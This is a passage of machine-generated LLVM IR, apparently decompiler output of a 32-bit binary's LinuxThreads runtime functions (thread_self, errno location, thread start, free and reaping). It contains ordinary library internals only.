  uselistorder label %dec_label_pc_804b3b7, { 1, 0 }
  uselistorder label %dec_label_pc_804b3a6, { 1, 0 }
  uselistorder label %dec_label_pc_804b391, { 1, 0 }
  uselistorder label %dec_label_pc_804b365, { 1, 0 }
  uselistorder label %dec_label_pc_804b2ee, { 1, 0 }
  uselistorder label %dec_label_pc_804b2b3, { 1, 0 }
  uselistorder label %dec_label_pc_804b224, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804b1ea, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804b17a, { 1, 0 }
  uselistorder label %dec_label_pc_804b0d4, { 1, 0 }
}

define i32 @thread_self() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_804b5f4 = load i32, i32* @esp, align 4
  %v1_804b5f4 = load i32, i32* @global_var_806338c.133, align 4
  %v7_804b5f4 = icmp ult i32 %v0_804b5f4, %v1_804b5f4
  %v1_804b5fa = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_804b5fa, i32* @edx, align 4
  %v1_804b601 = icmp eq i1 %v7_804b5f4, false
  br i1 %v1_804b601, label %dec_label_pc_804b632, label %dec_label_pc_804b603

dec_label_pc_804b603:                             ; preds = %entry
  %v1_804b603 = load i32, i32* @global_var_8063390.134, align 16
  %v7_804b603 = icmp ult i32 %v0_804b5f4, %v1_804b603
  br i1 %v7_804b603, label %dec_label_pc_804b618, label %dec_label_pc_804b60b

dec_label_pc_804b60b:                             ; preds = %dec_label_pc_804b603
  %v1_804b60b = load i32, i32* @global_var_8063394.135, align 4
  %v7_804b60b = icmp ult i32 %v0_804b5f4, %v1_804b60b
  br i1 %v7_804b60b, label %dec_label_pc_804b632, label %dec_label_pc_804b618

dec_label_pc_804b618:                             ; preds = %dec_label_pc_804b60b, %dec_label_pc_804b603
  %v0_804b618 = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804b618 = icmp eq i32 %v0_804b618, 0
  br i1 %v1_804b618, label %dec_label_pc_804b626, label %dec_label_pc_804b621

dec_label_pc_804b621:                             ; preds = %dec_label_pc_804b618
  %v0_804b621 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804b626

dec_label_pc_804b626:                             ; preds = %dec_label_pc_804b618, %dec_label_pc_804b621
  %v3_804b626 = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_804b626, i32* @edx, align 4
  %v2_804b62c = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804b632

dec_label_pc_804b632:                             ; preds = %dec_label_pc_804b60b, %entry, %dec_label_pc_804b626
  %v0_804b632 = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804b60b ], [ 134620864, %entry ], [ %v2_804b62c, %dec_label_pc_804b626 ]
  ret i32 %v0_804b632

; uselistorder directives
  uselistorder label %dec_label_pc_804b632, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b626, { 1, 0 }
}

define i32 @__h_errno_location() local_unnamed_addr {
entry:
  %v0_804b636 = call i32 @thread_self()
  %v1_804b63b = add i32 %v0_804b636, 76
  %v2_804b63b = inttoptr i32 %v1_804b63b to i32*
  %v3_804b63b = load i32, i32* %v2_804b63b, align 4
  ret i32 %v3_804b63b
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804b645 = call i32 @thread_self()
  %v1_804b64a = add i32 %v0_804b645, 68
  %v2_804b64a = inttoptr i32 %v1_804b64a to i32*
  %v3_804b64a = load i32, i32* %v2_804b64a, align 4
  ret i32 %v3_804b64a
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804b654 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804b65c = load i32, i32* @global_var_80628b8.138, align 8
  %v7_804b662 = icmp slt i32 %v1_804b65c, %arg1
  br i1 %v7_804b662, label %dec_label_pc_804b664, label %dec_label_pc_804b69b

dec_label_pc_804b664:                             ; preds = %entry
  %v1_804b669 = call i32 @sched_get_priority_max(i32 1)
  %v0_804b671 = load i32, i32* @ebx, align 4
  %v2_804b671 = sub i32 %v0_804b671, %v1_804b669
  %v8_804b671 = xor i32 %v0_804b671, %v1_804b669
  %v9_804b671 = xor i32 %v2_804b671, %v0_804b671
  %v10_804b671 = and i32 %v9_804b671, %v8_804b671
  %v11_804b671 = icmp slt i32 %v10_804b671, 0
  %v13_804b671 = icmp slt i32 %v2_804b671, 0
  %v2_804b673 = icmp ne i1 %v13_804b671, %v11_804b671
  %v3_804b673 = zext i1 %v2_804b673 to i32
  %v2_804b679 = add i32 %v3_804b673, %v0_804b671
  store i32 %v2_804b679, i32* %stack_var_-8, align 4
  %v2_804b680 = ptrtoint i32* %stack_var_-8 to i32
  %v0_804b687 = load i32, i32* @global_var_80628b4.139, align 4
  %v3_804b68d = call i32 @sched_setscheduler(i32 %v0_804b687, i32 1, i32 %v2_804b680)
  %v0_804b695 = load i32, i32* @ebx, align 4
  store i32 %v0_804b695, i32* @global_var_80628b8.138, align 8
  br label %dec_label_pc_804b69b

dec_label_pc_804b69b:                             ; preds = %entry, %dec_label_pc_804b664
  %.0 = phi i32 [ %v3_804b68d, %dec_label_pc_804b664 ], [ undef, %entry ]
  store i32 %v0_804b654, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_804b671, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804b69b, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %v0_804b6a8 = load i32, i32* @global_var_8063244.140, align 4
  %v1_804b6ad = icmp eq i32 %v0_804b6a8, 0
  %v1_804b6af = icmp eq i1 %v1_804b6ad, false
  br i1 %v1_804b6af, label %dec_label_pc_804b6bd.thread, label %dec_label_pc_804b6bd

dec_label_pc_804b6bd.thread:                      ; preds = %entry
  store i32 1, i32* @global_var_8063244.140, align 4
  br label %dec_label_pc_804b701

dec_label_pc_804b6bd:                             ; preds = %entry
  %v0_804b6b3 = load i32, i32* @global_var_8063248.141, align 8
  %v1_804b6b3 = icmp eq i32 %v0_804b6b3, 0
  %v1_804b6ba = icmp eq i1 %v1_804b6b3, false
  %phitmp = icmp eq i1 %v1_804b6ba, false
  store i32 1, i32* @global_var_8063244.140, align 4
  br i1 %phitmp, label %dec_label_pc_804b701, label %dec_label_pc_804b6cb

dec_label_pc_804b6cb:                             ; preds = %dec_label_pc_804b6bd
  store i32 0, i32* %stack_var_-148, align 4
  %v2_804b6db = ptrtoint i32* %stack_var_-148 to i32
  br label %dec_label_pc_804b6db

dec_label_pc_804b6db:                             ; preds = %dec_label_pc_804b6f7, %dec_label_pc_804b6cb
  %v0_804b6e6 = load i32, i32* @global_var_8062a84.142, align 4
  store i32 %v0_804b6e6, i32* %stack_var_-188, align 4
  %v3_804b6ec = call i32 @__libc_write(i32 %v0_804b6e6, i32 %v2_804b6db, i32 148)
  %v1_804b6f4 = add i32 %v3_804b6ec, 1
  %v8_804b6f4 = icmp eq i32 %v1_804b6f4, 0
  %v1_804b6f5 = icmp eq i1 %v8_804b6f4, false
  br i1 %v1_804b6f5, label %dec_label_pc_804b701, label %dec_label_pc_804b6f7

dec_label_pc_804b6f7:                             ; preds = %dec_label_pc_804b6db
  %v0_804b6f7 = load i32, i32* %stack_var_-188, align 4
  %v1_804b6f7 = call i32 @__errno_location(i32 %v0_804b6f7)
  %v1_804b6fc = inttoptr i32 %v1_804b6f7 to i32*
  %v2_804b6fc = load i32, i32* %v1_804b6fc, align 4
  %v11_804b6fc = icmp eq i32 %v2_804b6fc, 4
  br i1 %v11_804b6fc, label %dec_label_pc_804b6db, label %dec_label_pc_804b6f7.dec_label_pc_804b701.loopexit_crit_edge

dec_label_pc_804b6f7.dec_label_pc_804b701.loopexit_crit_edge: ; preds = %dec_label_pc_804b6f7
  br label %dec_label_pc_804b701

dec_label_pc_804b701:                             ; preds = %dec_label_pc_804b6db, %dec_label_pc_804b6bd.thread, %dec_label_pc_804b6f7.dec_label_pc_804b701.loopexit_crit_edge, %dec_label_pc_804b6bd
  %v0_804b707 = phi i32 [ %v0_804b6a8, %dec_label_pc_804b6bd ], [ %v1_804b6f7, %dec_label_pc_804b6f7.dec_label_pc_804b701.loopexit_crit_edge ], [ %v0_804b6a8, %dec_label_pc_804b6bd.thread ], [ %v1_804b6f4, %dec_label_pc_804b6db ]
  ret i32 %v0_804b707

; uselistorder directives
  uselistorder i32* %stack_var_-148, { 1, 0 }
  uselistorder label %dec_label_pc_804b701, { 2, 0, 3, 1 }
}

define i32 @pthread_kill_all_threads() local_unnamed_addr {
dec_label_pc_804b730:
  %stack_var_-12 = alloca i32, align 4
  %v0_804b709 = load i32, i32* @edx, align 4
  %v0_804b70c = load i32, i32* @eax, align 4
  %v0_804b70e = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  %v0_804b713 = load i32, i32* @ebx, align 4
  store i32 %v0_804b713, i32* %stack_var_-12, align 4
  store i32 %v0_804b70e, i32* @ebx, align 4
  %v1_804b730 = icmp eq i32 %v0_804b709, 0
  br i1 %v1_804b730, label %dec_label_pc_804b742, label %dec_label_pc_804b734

dec_label_pc_804b734:                             ; preds = %dec_label_pc_804b730
  %v1_804b737 = add i32 %v0_804b70e, 20
  %v2_804b737 = inttoptr i32 %v1_804b737 to i32*
  %v3_804b737 = load i32, i32* %v2_804b737, align 4
  %v2_804b73a = call i32 @kill(i32 %v3_804b737, i32 %v0_804b70c)
  %v2_804b742.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804b742

dec_label_pc_804b742:                             ; preds = %dec_label_pc_804b730, %dec_label_pc_804b734
  %v2_804b742 = phi i32 [ %v0_804b713, %dec_label_pc_804b730 ], [ %v2_804b742.pre, %dec_label_pc_804b734 ]
  %v0_804b745 = phi i32 [ %v0_804b70e, %dec_label_pc_804b730 ], [ %v2_804b73a, %dec_label_pc_804b734 ]
  store i32 %v2_804b742, i32* @ebx, align 4
  ret i32 %v0_804b745

; uselistorder directives
  uselistorder i32 %v0_804b70e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b742, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804b746 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804b754 = call i32 @__libc_getpid(i32 %v0_804b746)
  %v1_804b759 = load i32, i32* @ebx, align 4
  %v2_804b759 = add i32 %v1_804b759, 20
  %v3_804b759 = inttoptr i32 %v2_804b759 to i32*
  store i32 %v1_804b754, i32* %v3_804b759, align 4
  %v0_804b75f = load i32, i32* @ebx, align 4
  %v1_804b75f = add i32 %v0_804b75f, 100
  store i32 %v1_804b75f, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v3_804b765 = inttoptr i32 %v1_804b75f to %_TYPEDEF_sigset_t*
  %v4_804b765 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804b765, i32 0)
  store i32 %v4_804b765, i32* %eax.global-to-local, align 4
  %v0_804b76a = load i32, i32* @ebx, align 4
  %v1_804b76a = add i32 %v0_804b76a, 228
  %v2_804b76a = inttoptr i32 %v1_804b76a to i32*
  %v3_804b76a = load i32, i32* %v2_804b76a, align 4
  %v2_804b773 = icmp slt i32 %v3_804b76a, 0
  br i1 %v2_804b773, label %dec_label_pc_804b782, label %dec_label_pc_804b777

dec_label_pc_804b777:                             ; preds = %entry
  %v1_804b778 = add i32 %v0_804b76a, 232
  br label %dec_label_pc_804b7a1

dec_label_pc_804b782:                             ; preds = %entry
  %v0_804b782 = load i32, i32* @global_var_80628b8.138, align 8
  %tmp16 = icmp slt i32 %v0_804b782, 1
  br i1 %tmp16, label %dec_label_pc_804b7ac, label %dec_label_pc_804b78b

dec_label_pc_804b78b:                             ; preds = %dec_label_pc_804b782
  store i32 0, i32* %stack_var_-8, align 4
  %v2_804b797 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_804b7a1

dec_label_pc_804b7a1:                             ; preds = %dec_label_pc_804b777, %dec_label_pc_804b78b
  %storemerge2 = phi i32 [ %v1_804b778, %dec_label_pc_804b777 ], [ %v2_804b797, %dec_label_pc_804b78b ]
  %storemerge1 = phi i32 [ %v3_804b76a, %dec_label_pc_804b777 ], [ 0, %dec_label_pc_804b78b ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_804b7a1 = add i32 %v0_804b76a, 20
  %v2_804b7a1 = inttoptr i32 %v1_804b7a1 to i32*
  %v3_804b7a1 = load i32, i32* %v2_804b7a1, align 4
  store i32 %v3_804b7a1, i32* %stack_var_-188, align 4
  %v3_804b7a4 = call i32 @sched_setscheduler(i32 %v3_804b7a1, i32 %storemerge1, i32 %storemerge2)
  store i32 %v3_804b7a4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b7ac

dec_label_pc_804b7ac:                             ; preds = %dec_label_pc_804b782, %dec_label_pc_804b7a1
  %v0_804b7ac = load i32, i32* @global_var_8067a00.144, align 512
  store i32 %v0_804b7ac, i32* %eax.global-to-local, align 4
  %v1_804b7b1 = icmp eq i32 %v0_804b7ac, 0
  br i1 %v1_804b7b1, label %dec_label_pc_804b7fc, label %dec_label_pc_804b7b5

dec_label_pc_804b7b5:                             ; preds = %dec_label_pc_804b7ac
  %v0_804b7b5 = load i32, i32* @global_var_8062a90.145, align 16
  %tmp17 = icmp slt i32 %v0_804b7b5, 1
  br i1 %tmp17, label %dec_label_pc_804b7fc, label %dec_label_pc_804b7be

dec_label_pc_804b7be:                             ; preds = %dec_label_pc_804b7b5
  %v0_804b7be = load i32, i32* @ebx, align 4
  store i32 %v0_804b7be, i32* %stack_var_-156, align 4
  %v2_804b7ca = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_804b7ca

dec_label_pc_804b7ca:                             ; preds = %dec_label_pc_804b7e6, %dec_label_pc_804b7be
  store i32 %v2_804b7ca, i32* %eax.global-to-local, align 4
  %v0_804b7d5 = load i32, i32* @global_var_8062a84.142, align 4
  store i32 %v0_804b7d5, i32* %stack_var_-188, align 4
  %v3_804b7db = call i32 @__libc_write(i32 %v0_804b7d5, i32 %v2_804b7ca, i32 148)
  %v1_804b7e3 = add i32 %v3_804b7db, 1
  %v8_804b7e3 = icmp eq i32 %v1_804b7e3, 0
  store i32 %v1_804b7e3, i32* %eax.global-to-local, align 4
  %v1_804b7e4 = icmp eq i1 %v8_804b7e3, false
  br i1 %v1_804b7e4, label %dec_label_pc_804b7f0, label %dec_label_pc_804b7e6

dec_label_pc_804b7e6:                             ; preds = %dec_label_pc_804b7ca
  %v0_804b7e6 = load i32, i32* %stack_var_-188, align 4
  %v1_804b7e6 = call i32 @__errno_location(i32 %v0_804b7e6)
  store i32 %v1_804b7e6, i32* %eax.global-to-local, align 4
  %v1_804b7eb = inttoptr i32 %v1_804b7e6 to i32*
  %v2_804b7eb = load i32, i32* %v1_804b7eb, align 4
  %v11_804b7eb = icmp eq i32 %v2_804b7eb, 4
  br i1 %v11_804b7eb, label %dec_label_pc_804b7ca, label %dec_label_pc_804b7e6.dec_label_pc_804b7f0_crit_edge

dec_label_pc_804b7e6.dec_label_pc_804b7f0_crit_edge: ; preds = %dec_label_pc_804b7e6
  br label %dec_label_pc_804b7f0

dec_label_pc_804b7f0:                             ; preds = %dec_label_pc_804b7ca, %dec_label_pc_804b7e6.dec_label_pc_804b7f0_crit_edge
  %v0_804b7f3 = load i32, i32* @ebx, align 4
  store i32 %v0_804b7f3, i32* %stack_var_-188, align 4
  %v1_804b7f4 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804b7f3)
  store i32 %v1_804b7f4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b7fc

dec_label_pc_804b7fc:                             ; preds = %dec_label_pc_804b7b5, %dec_label_pc_804b7ac, %dec_label_pc_804b7f0
  %v0_804b7ff = load i32, i32* @ebx, align 4
  %v1_804b7ff = add i32 %v0_804b7ff, 96
  %v2_804b7ff = inttoptr i32 %v1_804b7ff to i32*
  %v3_804b7ff = load i32, i32* %v2_804b7ff, align 4
  store i32 %v3_804b7ff, i32* %stack_var_-188, align 4
  %v5_804b802 = add i32 %v0_804b7ff, 92
  %v6_804b802 = inttoptr i32 %v5_804b802 to i32*
  %v7_804b802 = load i32, i32* %v6_804b802, align 4
  call void @__pseudo_call(i32 %v7_804b802)
  store i32 %v3_804b7ff, i32* @ecx, align 4
  %v2_804b807 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_804b807, i32* %stack_var_-188, align 4
  %v0_804b80f = load i32, i32* %eax.global-to-local, align 4
  %v2_804b810 = call i32 @__pthread_do_exit(i32 %v0_804b80f, i32 %v2_804b807)
  store i32 %v2_804b810, i32* %eax.global-to-local, align 4
  ret i32 %v2_804b810

; uselistorder directives
  uselistorder i32 %v3_804b76a, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 5, 1, 3, 2, 4, 6, 7, 10, 8, 9 }
  uselistorder label %dec_label_pc_804b7fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b7f0, { 1, 0 }
  uselistorder label %dec_label_pc_804b7ac, { 1, 0 }
  uselistorder label %dec_label_pc_804b7a1, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804b815 = load i32, i32* @ebx, align 4
  store i32 %v0_804b815, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804b81d = call i32 @__libc_getpid(i32 %v0_804b815)
  store i32 0, i32* @edx, align 4
  %v1_804b824 = load i32, i32* @ebx, align 4
  %v2_804b824 = add i32 %v1_804b824, 20
  %v3_804b824 = inttoptr i32 %v2_804b824 to i32*
  store i32 %v1_804b81d, i32* %v3_804b824, align 4
  %v0_804b827 = load i32, i32* @ebx, align 4
  %v1_804b827 = add i32 %v0_804b827, 28
  %v2_804b827 = inttoptr i32 %v1_804b827 to i32*
  %v3_804b827 = load i32, i32* %v2_804b827, align 4
  store i32 %v3_804b827, i32* @eax, align 4
  %v0_804b82a = load i32, i32* %stack_var_-4, align 4
  %v1_804b82a = call i32 @__pthread_lock(i32 %v0_804b82a)
  %v0_804b832 = load i32, i32* @ebx, align 4
  %v1_804b832 = add i32 %v0_804b832, 28
  %v2_804b832 = inttoptr i32 %v1_804b832 to i32*
  %v3_804b832 = load i32, i32* %v2_804b832, align 4
  %v1_804b835 = inttoptr i32 %v3_804b832 to i32*
  %v2_804b835 = call i32 @__pthread_unlock(i32* %v1_804b835)
  %v0_804b83a = load i32, i32* @ebx, align 4
  %v1_804b83d = call i32 @pthread_start_thread(i32 %v0_804b83a)
  ret i32 %v1_804b83d
}

define i32 @pthread_free() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804b842 = load i32, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v0_804b845 = load i32, i32* @ebx, align 4
  %v0_804b846 = load i32, i32* @eax, align 4
  store i32 %v0_804b846, i32* @esi, align 4
  %v1_804b84b = add i32 %v0_804b846, 16
  %v2_804b84b = inttoptr i32 %v1_804b84b to i32*
  %v3_804b84b = load i32, i32* %v2_804b84b, align 4
  %v1_804b84e = mul i32 %v3_804b84b, 16
  %v2_804b854 = and i32 %v1_804b84e, 16368
  %v1_804b857 = add i32 %v2_804b854, ptrtoint (i32* @global_var_805e6a0.146 to i32)
  store i32 %v1_804b857, i32* @ebx, align 4
  store i32 %v1_804b857, i32* @eax, align 4
  %v1_804b85f = call i32 @__pthread_lock(i32 %v0_804b845)
  %v0_804b867 = load i32, i32* @ebx, align 4
  %v1_804b867 = add i32 %v0_804b867, 8
  %v2_804b867 = inttoptr i32 %v1_804b867 to i32*
  store i32 0, i32* %v2_804b867, align 4
  %v0_804b86e = load i32, i32* @ebx, align 4
  %v1_804b86e = add i32 %v0_804b86e, 12
  %v2_804b86e = inttoptr i32 %v1_804b86e to i32*
  store i32 -1, i32* %v2_804b86e, align 4
  %v0_804b875 = load i32, i32* @ebx, align 4
  %v1_804b876 = inttoptr i32 %v0_804b875 to i32*
  %v2_804b876 = call i32 @__pthread_unlock(i32* %v1_804b876)
  %v0_804b87b = load i32, i32* @global_var_80626a0.147, align 32
  %v1_804b880 = add i32 %v0_804b87b, -1
  store i32 %v1_804b880, i32* @global_var_80626a0.147, align 32
  %v0_804b886 = load i32, i32* @esi, align 4
  %v1_804b886 = add i32 %v0_804b886, 448
  %v2_804b886 = inttoptr i32 %v1_804b886 to i32*
  %storemerge24 = load i32, i32* %v2_804b886, align 4
  %v1_804b89e25 = icmp eq i32 %storemerge24, 0
  %v1_804b8a027 = icmp eq i1 %v1_804b89e25, false
  br i1 %v1_804b8a027, label %dec_label_pc_804b88e.lr.ph, label %dec_label_pc_804b8a2

dec_label_pc_804b88e.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804b88e

dec_label_pc_804b88e:                             ; preds = %dec_label_pc_804b88e.lr.ph, %dec_label_pc_804b88e
  %storemerge28 = phi i32 [ %storemerge24, %dec_label_pc_804b88e.lr.ph ], [ %storemerge, %dec_label_pc_804b88e ]
  %v1_804b88e = inttoptr i32 %storemerge28 to i32*
  %v2_804b88e = load i32, i32* %v1_804b88e, align 4
  store i32 %v2_804b88e, i32* @ebx, align 4
  %v1_804b894 = call i32 @free(i32 %storemerge28)
  %storemerge = load i32, i32* @ebx, align 4
  %v1_804b89e = icmp eq i32 %storemerge, 0
  %v1_804b8a0 = icmp eq i1 %v1_804b89e, false
  br i1 %v1_804b8a0, label %dec_label_pc_804b88e, label %dec_label_pc_804b89b.dec_label_pc_804b8a2_crit_edge

dec_label_pc_804b89b.dec_label_pc_804b8a2_crit_edge: ; preds = %dec_label_pc_804b88e
  %v0_804b8a2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b8a2

dec_label_pc_804b8a2:                             ; preds = %dec_label_pc_804b89b.dec_label_pc_804b8a2_crit_edge, %entry
  %v0_804b8a2 = phi i32 [ %v0_804b8a2.pre, %dec_label_pc_804b89b.dec_label_pc_804b8a2_crit_edge ], [ %v0_804b886, %entry ]
  %v1_804b8a2 = add i32 %v0_804b8a2, 452
  %v2_804b8a2 = inttoptr i32 %v1_804b8a2 to i32*
  %storemerge23 = load i32, i32* %v2_804b8a2, align 4
  %v1_804b8ba4 = icmp eq i32 %storemerge23, 0
  %v1_804b8bc11 = icmp eq i1 %v1_804b8ba4, false
  br i1 %v1_804b8bc11, label %dec_label_pc_804b8aa.preheader, label %dec_label_pc_804b8be

dec_label_pc_804b8aa.preheader:                   ; preds = %dec_label_pc_804b8a2
  br label %dec_label_pc_804b8aa

dec_label_pc_804b8aa:                             ; preds = %dec_label_pc_804b8aa.preheader, %dec_label_pc_804b8aa
  %v0_804b8af = phi i32 [ %storemerge2, %dec_label_pc_804b8aa ], [ %storemerge23, %dec_label_pc_804b8aa.preheader ]
  %v1_804b8aa = inttoptr i32 %v0_804b8af to i32*
  %v2_804b8aa = load i32, i32* %v1_804b8aa, align 4
  store i32 %v2_804b8aa, i32* @ebx, align 4
  %v1_804b8b0 = call i32 @free(i32 %v0_804b8af)
  %storemerge2 = load i32, i32* @ebx, align 4
  %v1_804b8ba = icmp eq i32 %storemerge2, 0
  %v1_804b8bc = icmp eq i1 %v1_804b8ba, false
  br i1 %v1_804b8bc, label %dec_label_pc_804b8aa, label %dec_label_pc_804b8ba.dec_label_pc_804b8be_crit_edge

dec_label_pc_804b8ba.dec_label_pc_804b8be_crit_edge: ; preds = %dec_label_pc_804b8aa
  %v0_804b8be.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b8be

dec_label_pc_804b8be:                             ; preds = %dec_label_pc_804b8ba.dec_label_pc_804b8be_crit_edge, %dec_label_pc_804b8a2
  %v0_804b8dc = phi i32 [ %v0_804b8be.pre, %dec_label_pc_804b8ba.dec_label_pc_804b8be_crit_edge ], [ %v0_804b8a2, %dec_label_pc_804b8a2 ]
  %v6_804b8be = icmp eq i32 %v0_804b8dc, 134620864
  br i1 %v6_804b8be, label %dec_label_pc_804b900, label %dec_label_pc_804b8c6

dec_label_pc_804b8c6:                             ; preds = %dec_label_pc_804b8be
  %v1_804b8c6 = add i32 %v0_804b8dc, 392
  %v2_804b8c6 = inttoptr i32 %v1_804b8c6 to i32*
  %v3_804b8c6 = load i32, i32* %v2_804b8c6, align 4
  %v4_804b8c6 = icmp eq i32 %v3_804b8c6, 0
  %v1_804b8cd = icmp eq i1 %v4_804b8c6, false
  br i1 %v1_804b8cd, label %dec_label_pc_804b900, label %dec_label_pc_804b8cf

dec_label_pc_804b8cf:                             ; preds = %dec_label_pc_804b8c6
  %v1_804b8cf = add i32 %v0_804b8dc, 400
  %v2_804b8cf = inttoptr i32 %v1_804b8cf to i32*
  %v3_804b8cf = load i32, i32* %v2_804b8cf, align 4
  %v1_804b8d5 = icmp eq i32 %v3_804b8cf, 0
  br i1 %v1_804b8d5, label %dec_label_pc_804b8ea, label %dec_label_pc_804b8d9

dec_label_pc_804b8d9:                             ; preds = %dec_label_pc_804b8cf
  %v0_804b8d9 = load i32, i32* @edx, align 4
  %v1_804b8dc = add i32 %v0_804b8dc, 396
  %v2_804b8dc = inttoptr i32 %v1_804b8dc to i32*
  %v3_804b8dc = load i32, i32* %v2_804b8dc, align 4
  %v4_804b8e2 = call i32 @munmap(i32 %v3_804b8dc, i32 %v3_804b8cf, i32 %v0_804b8d9, i32 %v0_804b8d9)
  %v0_804b8f1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b8ea

dec_label_pc_804b8ea:                             ; preds = %dec_label_pc_804b8cf, %dec_label_pc_804b8d9
  %v0_804b8f1 = phi i32 [ %v0_804b8f1.pre, %dec_label_pc_804b8d9 ], [ %v0_804b8dc, %dec_label_pc_804b8cf ]
  %v0_804b8ea = phi i32 [ %v4_804b8e2, %dec_label_pc_804b8d9 ], [ 0, %dec_label_pc_804b8cf ]
  %v1_804b8f1 = add i32 %v0_804b8f1, -2096672
  %v4_804b8f8 = call i32 @munmap(i32 %v1_804b8f1, i32 2097152, i32 %v0_804b8ea, i32 %v0_804b8ea)
  br label %dec_label_pc_804b900

dec_label_pc_804b900:                             ; preds = %dec_label_pc_804b8c6, %dec_label_pc_804b8be, %dec_label_pc_804b8ea
  %v2_804b900 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804b845, i32* @ebx, align 4
  store i32 %v0_804b842, i32* @esi, align 4
  ret i32 %v2_804b900

; uselistorder directives
  uselistorder i32 %v0_804b8dc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %v0_804b8a2, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %storemerge28, { 1, 0 }
  uselistorder label %dec_label_pc_804b900, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b8ea, { 1, 0 }
  uselistorder label %dec_label_pc_804b8aa, { 1, 0 }
  uselistorder label %dec_label_pc_804b88e, { 1, 0 }
}

define i32 @restart() local_unnamed_addr {
entry:
  %v0_804b907 = load i32, i32* @eax, align 4
  %v1_804b908 = call i32 @__pthread_restart_new(i32 %v0_804b907)
  ret i32 %v1_804b908
}

define i32 @pthread_reap_children() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b911 = load i32, i32* @esi, align 4
  %v0_804b912 = load i32, i32* @ebx, align 4
  store i32 %v0_804b912, i32* %stack_var_-8, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_804b9e8 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_804b9e2

dec_label_pc_804b91b:                             ; preds = %dec_label_pc_804b9e2
  %v0_804b91b = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  br label %dec_label_pc_804b99a

dec_label_pc_804b925:                             ; preds = %dec_label_pc_804b99a
  %v1_804b925 = add i32 %v0_804b92c, 20
  %v2_804b925 = inttoptr i32 %v1_804b925 to i32*
  %v3_804b925 = load i32, i32* %v2_804b925, align 4
  %v15_804b925 = icmp eq i32 %v3_804b925, %v3_804b9ef
  %v1_804b928 = inttoptr i32 %v0_804b92c to i32*
  %v2_804b928 = load i32, i32* %v1_804b928, align 4
  store i32 %v2_804b928, i32* %edx.global-to-local, align 4
  %v1_804b92a = icmp eq i1 %v15_804b925, false
  br i1 %v1_804b92a, label %dec_label_pc_804b99a, label %dec_label_pc_804b92c

dec_label_pc_804b92c:                             ; preds = %dec_label_pc_804b925
  %v1_804b92c = add i32 %v0_804b92c, 4
  %v2_804b92c = inttoptr i32 %v1_804b92c to i32*
  %v3_804b92c = load i32, i32* %v2_804b92c, align 4
  %v2_804b92f = add i32 %v2_804b928, 4
  %v3_804b92f = inttoptr i32 %v2_804b92f to i32*
